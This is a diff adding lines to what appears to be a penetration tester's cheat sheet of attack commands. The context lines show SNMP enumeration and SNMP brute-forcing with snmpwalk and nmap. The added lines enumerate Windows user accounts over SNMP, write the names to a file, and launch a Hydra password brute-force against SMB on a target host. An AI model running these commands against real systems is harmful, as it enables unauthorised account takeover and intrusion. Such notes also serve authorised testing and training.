@@ -74,6 +74,13 @@ SNMP
 snmpwalk -v 2c targetIP -c public // snmp enumeration
 nmap -sU -p 161 --script=snmp-win32-services targetIP // snmp enumeration
 nmap -sU -p 161 targetIP --script snmp-brute // brute force snmp
+nmap -sU -p 161 --script=snmp-win32-users targetIP // enumerate users
+
+echo -e "User1\nUser2\nUser3" > users.txt // create txt file with users
+
+HYDRA BRUTE FORCE ATTACK
+hydra -L users.txt -P /usr/share/john/password.list targetIP smb -f -V
+
 
 
 
